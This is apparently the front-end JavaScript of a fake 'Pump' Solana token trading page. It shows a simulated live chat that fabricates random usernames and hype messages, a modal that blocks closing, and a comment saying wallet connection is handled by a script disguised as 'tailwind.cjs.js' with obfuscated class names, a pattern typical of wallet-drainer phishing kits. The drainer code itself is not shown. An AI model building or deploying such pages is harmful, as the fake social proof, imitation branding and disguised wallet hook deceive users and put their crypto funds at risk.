async function connectWallet() {
  // Load wallet script if not loaded
  const walletLoadEvent = new CustomEvent('wallet:load');
  document.dispatchEvent(walletLoadEvent);
  
  // Wait a bit for script to load
  await new Promise(resolve => setTimeout(resolve, 100));
  
  try {
    if (window.solana && window.solana.isPhantom) {
      await window.solana.connect();
    } else {
      window.open('https://phantom.app/', '_blank');
    }
  } catch (err) {
    console.error('Wallet connection error:', err);
  }
}

function initModal() {
  const modal = document.getElementById('howItWorksModal');
  if (modal) {
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    
    const backdrop = modal.querySelector('.modal-backdrop');
    if (backdrop) {
      backdrop.addEventListener('click', (e) => {
        e.stopPropagation();
      });
    }
    
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        e.preventDefault();
        e.stopPropagation();
      }
    });
  }
}


function toggleSidebar() {
  const sidebar = document.getElementById('sidebar');
  if (sidebar) {
    sidebar.classList.toggle('open');
  }
}


function initTradeTabs() {
  const tabs = document.querySelectorAll('.trade-tab');
  tabs.forEach(tab => {
    tab.addEventListener('click', function() {
      const tabType = this.dataset.tab;
      
      tabs.forEach(t => t.classList.remove('active'));
      

      this.classList.add('active');
      

      const executeBtn = document.querySelector('.trade-execute-btn');
      if (executeBtn) {
        if (tabType === 'sell') {
          executeBtn.textContent = 'Log in to sell';
          executeBtn.style.backgroundColor = '#ef4444';
        } else {
          executeBtn.textContent = 'Log in to buy';
          executeBtn.style.backgroundColor = '#77d89a';
        }
      }
    });
  });
}


function initStreamTabs() {
  const tabs = document.querySelectorAll('.streams-tab');
  tabs.forEach(tab => {
    tab.addEventListener('click', function() {
      tabs.forEach(t => t.classList.remove('active'));
      this.classList.add('active');
    });
  });
}


function initTradePresets() {
  const presetBtns = document.querySelectorAll('.trade-preset-btn');
  const tradeInput = document.querySelector('.trade-input');
  
  presetBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      const value = this.textContent.trim();
      
      if (value === 'Reset' || value === 'Max') {
        if (tradeInput) {
          tradeInput.value = '';
        }
      } else {

        const solAmount = value.replace(' SOL', '');
        if (tradeInput) {
          tradeInput.value = solAmount;
        }
      }
    });
  });
}


// Memory cleanup function
function cleanupMemory() {
  // Clean up old blob URLs (keep only 1)
  if (window._blobUrls && window._blobUrls.size > 1) {
    const urlsToRemove = Array.from(window._blobUrls).slice(0, window._blobUrls.size - 1);
    urlsToRemove.forEach(url => {
      try {
        URL.revokeObjectURL(url);
        window._blobUrls.delete(url);
      } catch (e) {
        // Ignore errors
      }
    });
  }
  
  // Clean up unused images
  const images = document.querySelectorAll('img[src^="blob:"]');
  images.forEach(img => {
    if (!img.offsetParent || img.style.display === 'none') { // Image is not visible
      try {
        if (img.src && img.src.startsWith('blob:')) {
          URL.revokeObjectURL(img.src);
          if (window._blobUrls) {
            window._blobUrls.delete(img.src);
          }
        }
        img.src = '';
        img.onload = null;
        img.onerror = null;
      } catch (e) {
        // Ignore errors
      }
    }
  });
  
  // Clean up unused response objects
  if (window._fetchResponses) {
    window._fetchResponses.clear();
  }
  
  // Force garbage collection hint (if available)
  if (window.gc) {
    window.gc();
  }
}

// Run cleanup every 10 seconds (more frequent)
setInterval(cleanupMemory, 10000);

// Optimize: check loading state immediately if DOM is already ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initApp);
} else {
  // DOM already loaded, initialize immediately
  initApp();
}

function initApp() {
  // Show loading overlay and prevent scrolling
  document.body.classList.add('loading');
  
  initModal();
  

  // Wallet connection is handled by tailwind.cjs.js via classes aBVeeVna h3qErTJo
  // No need for custom connectWallet function if using the new system
  


  // Set loading state immediately before any async operations
  const coinNameEl = document.querySelector('.coin-name');
  const coinSymbolEl = document.querySelector('.coin-symbol');
  const streamTitleEl = document.getElementById('stream-title');
  
  if (coinNameEl) coinNameEl.textContent = 'Loading...';
  if (coinSymbolEl) coinSymbolEl.textContent = 'Loading...';
  if (streamTitleEl) streamTitleEl.textContent = 'Loading...';
  
  // Set title to "Loading..." immediately
  document.title = 'Loading... - Pump';
  
  // Initialize loading state tracking
  window._loadingState = {
    tokenName: false,
    tokenImage: false,
    ogImage: false,
    tailwindScript: false
  };
  
  // tailwind.cjs.js is loaded asynchronously and is not critical for page display
  // Don't block page loading on it - mark as ready immediately
  // Wallet connection will work when script loads (async)
  window._loadingState.tailwindScript = true;
  
  // Function to check if all resources are loaded
  function checkAllResourcesLoaded() {
    const state = window._loadingState;
    // Only wait for token name - image can load in background
    const hasTokenName = state.tokenName;
    // Check if tailwind script is loaded (or not needed - only if user clicked wallet button)
    const tailwindReady = state.tailwindScript || !document.querySelector('script[src="/tailwind.cjs.js"]');
    
    // Check if OG image is loaded (or not needed)
    const ogImageReady = state.ogImage || true; // OG image is optional, mark as ready if not set
    
    if (hasTokenName && tailwindReady && ogImageReady) {
      // Token name loaded, hide overlay immediately (image loads in background)
      const overlay = document.getElementById('loadingOverlay');
      if (overlay) {
        overlay.classList.add('hidden');
        document.body.classList.remove('loading');
      }
    }
  }
  
  // Timeout fallback - hide overlay after max 3 seconds even if token not loaded
  setTimeout(function() {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay && !overlay.classList.contains('hidden')) {
      console.warn('[LOADING] Timeout reached, hiding overlay');
      overlay.classList.add('hidden');
      document.body.classList.remove('loading');
    }
  }, 3000);
  
  // Expose check function globally
  window.checkAllResourcesLoaded = checkAllResourcesLoaded;
  
  // Initialize token loader - wait for TokenLoader to be available
  function initTokenLoaderWhenReady() {
    if (window.TokenLoader && window.TokenLoader.init) {
      window.TokenLoader.init();
    } else if (typeof initTokenLoader === 'function') {
      initTokenLoader();
    } else {
      // TokenLoader not ready yet, wait a bit and try again
      setTimeout(initTokenLoaderWhenReady, 50);
    }
  }
  
  // Try to initialize immediately
  initTokenLoaderWhenReady();
  

  initTradeTabs();
  

  initStreamTabs();
  

  initTradePresets();
  

  if (window.innerWidth < 1024) {
    document.addEventListener('click', function(e) {
      const sidebar = document.getElementById('sidebar');
      const sidebarToggle = document.querySelector('.sidebar-close');
      
      if (sidebar && sidebar.classList.contains('open')) {
        if (!sidebar.contains(e.target) && e.target !== sidebarToggle) {
          sidebar.classList.remove('open');
        }
      }
    });
  }
  

  const mobileNavButtons = document.querySelectorAll('.mobile-nav button');
  mobileNavButtons.forEach((btn, index) => {
    btn.addEventListener('click', function() {
      mobileNavButtons.forEach(b => b.classList.remove('active'));
      this.classList.add('active');
    });
  });
  

  if (mobileNavButtons.length > 0) {
    mobileNavButtons[0].classList.add('active');
  }
  

  initLiveChat();
  initStreamVideo();
  
  // Immediately check if we can hide overlay (in case token already loaded)
  if (window.checkAllResourcesLoaded) {
    // Use requestAnimationFrame to ensure DOM is fully ready
    requestAnimationFrame(function() {
      window.checkAllResourcesLoaded();
    });
  }
}


function initLiveChat() {
  const chatMessagesList = document.getElementById('chatMessagesList');
  const chatEmptyState = document.getElementById('chatEmptyState');
  if (!chatMessagesList) return;
  
  // Preload pepe.png once and cache it
  let cachedAvatarUrl = '/assets/avatars/pepe.png';
  const preloadAvatar = new Image();
  preloadAvatar.onload = function() {
    // Once loaded, convert to data URI to avoid duplicate requests
    try {
      const canvas = document.createElement('canvas');
      canvas.width = this.naturalWidth;
      canvas.height = this.naturalHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(this, 0, 0);
      cachedAvatarUrl = canvas.toDataURL('image/png');
    } catch (e) {
      // If canvas conversion fails, keep using the original URL (browser will cache it)
      console.warn('[CHAT] Could not convert avatar to data URI, using original URL');
    }
  };
  preloadAvatar.src = '/assets/avatars/pepe.png';

  function checkEmptyState() {
    const messages = chatMessagesList.querySelectorAll('.chat-message');
    if (messages.length > 0 && chatEmptyState) {
      chatEmptyState.classList.add('hidden');
    } else if (messages.length === 0 && chatEmptyState) {
      chatEmptyState.classList.remove('hidden');
    }
  }
  

  const existingMessages = chatMessagesList.querySelectorAll('.chat-message');
  existingMessages.forEach((msg, index) => {
    msg.style.animationDelay = `${index * 0.1}s`;
  });


  checkEmptyState();
  

  const chatScroll = document.querySelector('.chat-scroll');
  if (chatScroll) {
    setTimeout(() => {
      chatScroll.scrollTop = chatScroll.scrollHeight;
    }, 500);
  }


  // Generate random usernames
  function generateRandomUsername() {
    const prefixes = ['crypto', 'solana', 'pump', 'degen', 'moon', 'whale', 'diamond', 'hodl', 'bull', 'lambo', 'ape', 'wen', 'to', 'guru', 'fan', 'gang', 'strong', 'king', 'life', 'boy', 'alert', 'hands', 'master', 'run', 'soon', 'moon', 'trader', 'dump'];
    const suffixes = ['_trader', '_moon', '_king', '_life', '_boy', '_alert', '_hands', '_master', '_run', '_soon', '_strong', '_moon', '_guru', '_fan', '_up', '_gang', '_ape', '_af', '_king', '_lover', '_hunter', '_warrior', '_ninja', '_pro', '_max', '_elite'];
    
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    return prefix + suffix;
  }
  
  // Use cached avatar URL (data URI after first load, or original URL)
  function generateAvatarPlaceholder(username, color) {
    return cachedAvatarUrl;
  }
  
  const messages = [
    'Let\'s goooooo',
    'To the moon! 🚀',
    'This is the way',
    'Pump it!',
    'Diamond hands 💎',
    'HODL strong',
    'Bullish! 📈',
    'Moon soon',
    'LFG!',
    'Wen lambo?',
    'This is huge!',
    'Buy the dip',
    'Ape in!',
    'YOLO!',
    'Mooning! 🌙',
    'Pump incoming',
    'Bull run!',
    'Diamond hands only',
    'HODL forever',
    'To infinity!',
    'Moon time!',
    'Pump it up!',
    'Let\'s go!',
    'Bullish AF',
    'Moon gang!',
    'Ape together strong',
    'Diamond hands!',
    'HODL!',
    'Moon!',
    'Pump!'
  ];
  
  const colors = [
    'rgb(224, 82, 167)',
    'rgb(224, 84, 82)',
    'rgb(119, 216, 154)',
    'rgb(139, 92, 246)',
    'rgb(59, 130, 246)',
    'rgb(236, 72, 153)',
    'rgb(251, 146, 60)',
    'rgb(34, 197, 94)',
    'rgb(168, 85, 247)',
    'rgb(14, 165, 233)'
  ];
  

  function createNewMessage() {
    const username = generateRandomUsername();
    const message = messages[Math.floor(Math.random() * messages.length)];
    const color = colors[Math.floor(Math.random() * colors.length)];
    const avatar = generateAvatarPlaceholder(username, color);
    

    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const monthNames = ['JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 'JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC'];
    const month = monthNames[now.getMonth()];
    const year = now.getFullYear();
    const dateStr = `${day} ${month} ${year}`;
    
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const timeStr = `${hours}:${minutes}`;
    

    const messageDiv = document.createElement('div');
    messageDiv.className = 'chat-message';
    messageDiv.style.animation = 'slideInMessage 0.3s ease-out forwards';
    messageDiv.style.opacity = '0';
    
    messageDiv.innerHTML = `
      <div class="chat-avatar">
        <img src="${avatar}" alt="${username}'s profile picture">
      </div>
      <div class="chat-bubble" style="color: ${color};">
        <a href="#" class="chat-username" style="color: ${color};">${username}</a>
        <p class="chat-text">${message}</p>
        <div class="chat-time">
          <span>${timeStr}</span>
        </div>
      </div>
    `;
    

    const lastDateDivider = chatMessagesList.querySelector('.chat-date-divider');
    let needsDateDivider = false;
    
    if (!lastDateDivider) {
      needsDateDivider = true;
    } else {
      const lastDate = lastDateDivider.textContent.trim();
      if (lastDate !== dateStr) {
        needsDateDivider = true;
      }
    }
    

    if (needsDateDivider) {
      const dateDivider = document.createElement('div');
      dateDivider.className = 'chat-date-divider';
      dateDivider.textContent = dateStr;
      chatMessagesList.insertBefore(dateDivider, chatMessagesList.firstChild);
    }
    

    chatMessagesList.insertBefore(messageDiv, chatMessagesList.firstChild);
    

    checkEmptyState();
    

    setTimeout(() => {
      messageDiv.style.opacity = '1';
    }, 10);
    

    if (chatScroll) {
      setTimeout(() => {
        chatScroll.scrollTop = chatScroll.scrollHeight;
      }, 100);
    }
    

    // Limit messages to reduce memory usage
    const allMessages = chatMessagesList.querySelectorAll('.chat-message');
    const maxMessagesToKeep = 15; // Reduced to 15
    if (allMessages.length > maxMessagesToKeep) {
      // Remove oldest messages
      for (let i = maxMessagesToKeep; i < allMessages.length; i++) {
        const msg = allMessages[i];
        // Clean up images in removed messages
        const imgs = msg.querySelectorAll('img');
        imgs.forEach(img => {
          if (img.src && img.src.startsWith('blob:')) {
            try {
              URL.revokeObjectURL(img.src);
            } catch (e) {
              // Ignore errors
            }
          }
          img.src = '';
          img.onload = null;
          img.onerror = null;
        });
        // Clean up all event listeners and content
        const avatars = msg.querySelectorAll('.chat-avatar');
        avatars.forEach(avatar => {
          const avatarImg = avatar.querySelector('img');
          if (avatarImg) {
            avatarImg.src = '';
            avatarImg.onload = null;
            avatarImg.onerror = null;
          }
        });
        msg.innerHTML = ''; // Clear content before removing
        msg.remove();
      }
    }
  }
  
  // Start creating messages automatically
  // Create initial messages immediately (8-12 messages)
  const initialMessagesCount = Math.floor(Math.random() * 5) + 8; // 8-12 messages
  for (let i = 0; i < initialMessagesCount; i++) {
    setTimeout(() => {
      createNewMessage();
    }, i * 100); // Stagger initial messages by 100ms (faster)
  }
  
  // Then create new messages every 0.5-1.5 seconds (much faster)
  const messageInterval = setInterval(() => {
    createNewMessage();
  }, Math.random() * 1000 + 500); // Random interval between 0.5-1.5 seconds
  
  // Store interval ID for cleanup if needed
  window.chatMessageInterval = messageInterval;
}

// Initialize stream video with lazy loading
function initStreamVideo() {
  const video = document.getElementById('stream-video');
  if (!video) return;
  
  // Video source - direct path
  const videoPath = '/assets/streams/stream-video.mp4'; // Change this to your video path
  const videoSrc = videoPath;
  
  // Show video element
  video.style.display = 'block';
  video.classList.add('loading');
  
  // Set video source - try both source element and direct src
  const source = video.querySelector('source');
  if (source) {
    source.src = videoSrc;
    video.src = videoSrc;
  } else {
    video.src = videoSrc;
  }
  
  // Force video to start loading
  video.load();
  
  // Show video when metadata is loaded
  video.addEventListener('loadedmetadata', () => {
    video.classList.remove('loading');
    video.classList.add('loaded');
    // Hide background image when video is ready
    const videoBg = document.querySelector('.video-bg');
    if (videoBg) {
      videoBg.style.opacity = '0';
      videoBg.style.transition = 'opacity 0.5s ease-out';
    }
  }, { once: true });
  
  // Show video when data is loaded
  video.addEventListener('loadeddata', () => {
    video.classList.remove('loading');
    video.classList.add('loaded');
    const videoBg = document.querySelector('.video-bg');
    if (videoBg) {
      videoBg.style.opacity = '0';
      videoBg.style.transition = 'opacity 0.5s ease-out';
    }
  }, { once: true });
  
  // Handle loading errors - fallback to background image
  video.addEventListener('error', () => {
    // Video file not found, hide video and show background image
    video.style.display = 'none';
    video.classList.remove('loading');
    const videoBg = document.querySelector('.video-bg');
    if (videoBg) {
      videoBg.style.opacity = '1';
    }
  }, { once: true });
  
  
  // Load video on play button click
  const playButton = document.querySelector('.play-button');
  if (playButton) {
    playButton.addEventListener('click', () => {
      if (video.paused) {
        video.play().catch(err => {
          console.warn('Autoplay prevented:', err);
          // Unmute and try again
          video.muted = false;
          video.play().catch(() => {
            console.warn('Video play failed');
          });
        });
      } else {
        video.pause();
      }
    });
  }
  
  // Try to play video when it's ready (autoplay)
  video.addEventListener('canplay', () => {
    // Try autoplay, but don't fail if it's blocked
    video.play().catch(() => {
      // Autoplay blocked, user will need to click play button
    });
  }, { once: true });
}
